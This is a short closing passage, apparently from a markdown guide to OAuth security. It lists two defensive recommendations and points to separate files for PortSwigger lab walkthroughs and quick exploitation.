- Monitor OAuth flows for suspicious patterns
- Apply defense-in-depth security controls

For complete lab walkthroughs and detailed explanations, see `oauth-portswigger-labs-complete.md`. For quick exploitation, see `oauth-quickstart.md`.
